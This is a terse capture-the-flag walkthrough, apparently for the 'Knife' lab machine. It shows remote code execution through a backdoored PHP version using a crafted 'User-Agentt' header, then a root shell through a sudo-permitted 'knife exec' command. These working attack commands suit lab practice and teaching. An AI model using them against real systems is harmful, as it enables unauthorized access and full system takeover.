knife
---

## Steps

1. vulnerable php version

if we look at the headers, we see that it's powered by a vulnerable php version that has a backdoor installed. 

Achieve RCE using `User-Agentt:zerodiumsystem("cmd");`

You can get the user flag there

## Root Flag

1. sudo -l

`knife` can be run as sudo

`sudo knife exec -E 'exec "/bin/sh"'` to get root shell
